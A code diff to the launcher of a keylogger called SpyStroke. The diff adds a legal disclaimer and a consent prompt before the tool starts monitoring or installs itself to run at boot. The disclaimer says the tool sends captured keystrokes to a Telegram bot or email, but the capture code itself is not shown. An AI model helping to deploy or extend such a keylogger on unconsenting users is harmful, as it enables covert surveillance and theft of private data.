@@ -48,6 +48,42 @@ ENTRY_POINTS: dict[str, str] = {
     "email": "email/main.py",
 }
 
+#: Printed before any command that starts monitoring or installs persistence.
+DISCLAIMER = (
+    "\n[!] LEGAL DISCLAIMER\n"
+    "SpyStroke captures keystrokes and exfiltrates them to a Telegram bot or "
+    "email address.\n"
+    "Use it ONLY on devices you own or have explicit written permission to "
+    "monitor.\n"
+    "Unauthorized monitoring is illegal in most jurisdictions and violates "
+    "the privacy of others.\n"
+    "By continuing you confirm that you are authorized to do this.\n"
+)
+
+
+def _confirm_consent(force_yes: bool) -> bool:
+    """Print the disclaimer and require explicit consent to start monitoring.
+
+    ``force_yes`` (the ``--yes`` flag) skips the interactive prompt, for
+    scripts. In non-interactive contexts (CI, pipes) consent is never
+    assumed: the run aborts unless ``--yes`` was passed.
+    """
+    print(DISCLAIMER)
+    if force_yes:
+        return True
+    if not sys.stdin.isatty():
+        print(
+            "Non-interactive run: pass --yes to confirm you are authorized.",
+            file=sys.stderr,
+        )
+        return False
+    answer = (
+        input("Type 'yes' to confirm you are authorized to monitor this device: ")
+        .strip()
+        .lower()
+    )
+    return answer == "yes"
+
 #: How often the supervisor checks on the child (seconds).
 _POLL_INTERVAL = 0.5
 #: How long to wait for a graceful child shutdown before escalating.
@@ -285,9 +321,19 @@ def _build_parser() -> argparse.ArgumentParser:
 
     run_p = sub.add_parser("run", help="Run a bot under supervision (foreground).")
     run_p.add_argument("name", choices=sorted(ENTRY_POINTS))
+    run_p.add_argument(
+        "--yes",
+        action="store_true",
+        help="Skip the consent prompt (required when stdin is not a terminal)",
+    )
 
     install_p = sub.add_parser("install", help="Register a bot to start at boot.")
     install_p.add_argument("name", choices=sorted(ENTRY_POINTS))
+    install_p.add_argument(
+        "--yes",
+        action="store_true",
+        help="Skip the consent prompt (required when stdin is not a terminal)",
+    )
 
     uninstall_p = sub.add_parser("uninstall", help="Remove boot registration.")
     uninstall_p.add_argument("name", choices=sorted(ENTRY_POINTS))
@@ -299,6 +345,12 @@ def _build_parser() -> argparse.ArgumentParser:
 def main(argv: Optional[list[str]] = None) -> int:
     args = _build_parser().parse_args(argv)
     _setup_logging()
+
+    # Starting to monitor (run) or installing boot persistence (install) both
+    # require explicit consent; status/uninstall do not start monitoring.
+    if args.command in ("run", "install") and not _confirm_consent(args.yes):
+        print("Aborted: consent not confirmed.", file=sys.stderr)
+        return 1
 
     if args.command == "run":
         entry = repo_root() / ENTRY_POINTS[args.name]
